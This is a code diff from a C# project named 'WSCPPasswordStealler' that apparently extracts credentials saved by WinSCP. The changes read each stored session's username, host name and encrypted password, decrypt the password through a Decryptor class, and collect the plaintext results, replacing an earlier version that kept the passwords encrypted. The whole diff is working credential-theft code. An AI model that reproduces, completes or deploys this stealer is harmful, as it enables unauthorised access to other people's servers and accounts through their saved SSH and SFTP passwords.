@@ -1,4 +1,5 @@
-﻿using System.Text.RegularExpressions;
+﻿using System.Text;
+using System.Text.RegularExpressions;
 
 namespace WSCPPasswordStealler
 {
@@ -61,7 +62,7 @@ namespace WSCPPasswordStealler
             foreach (var section in _sections)
             {
                 var sectionName = section.Key;
-                if (sectionName.StartsWith("Configuration") ||
+                if (sectionName.StartsWith("Configuration") ||  
                    sectionName.StartsWith("SshHostKeys") ||
                    sectionName.StartsWith("CDCache"))
                     continue;
@@ -70,19 +71,17 @@ namespace WSCPPasswordStealler
                     properties.ContainsKey("UserName") &&
                     properties.ContainsKey("Password"))
                 {
-                    Connection con = new Connection(properties.GetValueOrDefault("Password", ""), properties.GetValueOrDefault("UserName", ""), properties.GetValueOrDefault("HostName", ""));
+                    string usrname = properties.GetValueOrDefault("UserName", "");
+                    string hostname = properties.GetValueOrDefault("HostName", "");
+                    byte[] pwd = Encoding.ASCII.GetBytes(properties.GetValueOrDefault("Password", ""));
+                    Decryptor dec = new Decryptor(pwd, usrname, hostname);
+                    string dec_pwd = dec.DecryptPassword();
+                    Connection con = new Connection(dec_pwd, usrname, hostname);
 
                     connections.Add(con);
                    
-                }
-                //Console.WriteLine(connections.Count);
-               
+                } 
             }
-            //foreach (Connection c in connections)
-            //{
-            //    Console.WriteLine(c._username);
-            //    Console.WriteLine(c._host);
-            //}
             return connections;
         }
         public class Connection
